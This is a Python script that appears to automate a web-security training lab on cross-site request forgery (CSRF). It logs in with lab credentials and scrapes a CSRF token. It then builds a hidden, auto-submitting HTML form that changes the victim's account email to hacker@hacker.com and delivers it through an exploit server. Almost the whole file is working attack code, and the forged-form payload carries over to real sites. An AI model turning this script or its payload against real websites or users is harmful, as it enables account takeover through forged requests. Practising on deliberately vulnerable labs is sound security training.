import argparse
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(url, proxies=None):
    try:
        response = requests.get(url + "my-account", proxies=proxies, verify=False, timeout=30)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrf'})
        return csrf_token['value'] if csrf_token else None
    except Exception as e:
        print(f"Error retrieving CSRF token: {e}")
        return None

def send_exploit_to_server(exploit_server, payload, proxies=None):
    try:
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
            'responseBody': payload,
            'formAction': 'DELIVER_TO_VICTIM'
        }

        print("Sending payload to exploit server...")
        requests.post(exploit_server, data=data, proxies=proxies, verify=False, timeout=30)
    except requests.exceptions.RequestException as e:
        print(f"Error sending exploit to server: {e}")

def csrf_attack(url, csrf_token, proxies=None):
    try:
        exploit_server = get_exploit_server(url, proxies)
        if not exploit_server:
            print("Could not find exploit server link")
            return False

        payload = f"""
        <html>
          <body>
            <form action="{url}my-account/change-email" method="POST">
              <input type="hidden" name="email" value="hacker@hacker.com">
              <input type="hidden" name="csrf" value="{csrf_token}">
            </form>
            <script>
              document.forms[0].submit();
            </script>
          </body>
        </html>
        """

        send_exploit_to_server(exploit_server, payload, proxies)

        return is_solved(url, proxies)
    except Exception as e:
        print(f"Error during CSRF attack: {e}")
        return False

def is_solved(url, proxies):
    try:
        response = requests.get(url, proxies=proxies, verify=False, timeout=30)
        if response.status_code != 200:
            return False
            
        soup = BeautifulSoup(response.text, 'html.parser')
        success_message = soup.find(string=lambda text: 'congratulations' in text.lower() if text else False)
        return bool(success_message)
    except Exception as e:
        print(f"Error checking solution: {e}")
        return False

def get_exploit_server(url, proxies=None):
    try:
        response = requests.get(url, proxies=proxies, verify=False, timeout=30)
        soup = BeautifulSoup(response.text, 'html.parser')
        exploit_link = soup.find('a', string='Go to exploit server')
        return exploit_link['href'] if exploit_link else None
    except Exception as e:
        print(f"Error finding exploit server: {e}")
        return None

def login(url, proxies=None):
    try:
        login_data = {
            'username': 'wiener',
            'password': 'peter'
        }
        response = requests.post(url + "login", data=login_data, proxies=proxies, verify=False, timeout=30)
        return 'Your username is' in response.text
    except Exception as e:
        print(f"Error during login: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='CSRF Exploit Lab 04')
    parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
    parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
    args = parser.parse_args()
    
    if not args.url.endswith('/'):
        args.url += '/'

    print(f"Starting CSRF Attack on: {args.url}")

    proxies = {
        'http': '127.0.0.1:8080',        
        'https': '127.0.0.1:8080'
    } if args.proxy else None

    if not login(args.url, proxies):
        print("Login failed!")
        return

    print("Successfully logged in!")

    csrf_token = get_csrf_token(args.url, proxies)
    if not csrf_token:
        print("CSRF token not found!")
        return

    print(f"CSRF Token: {csrf_token}")

    success = csrf_attack(args.url, csrf_token, proxies)
    if success:
        print("CSRF Lab completed successfully!")
    else:
        print("CSRF Lab failed.")

if __name__ == "__main__":
    main()
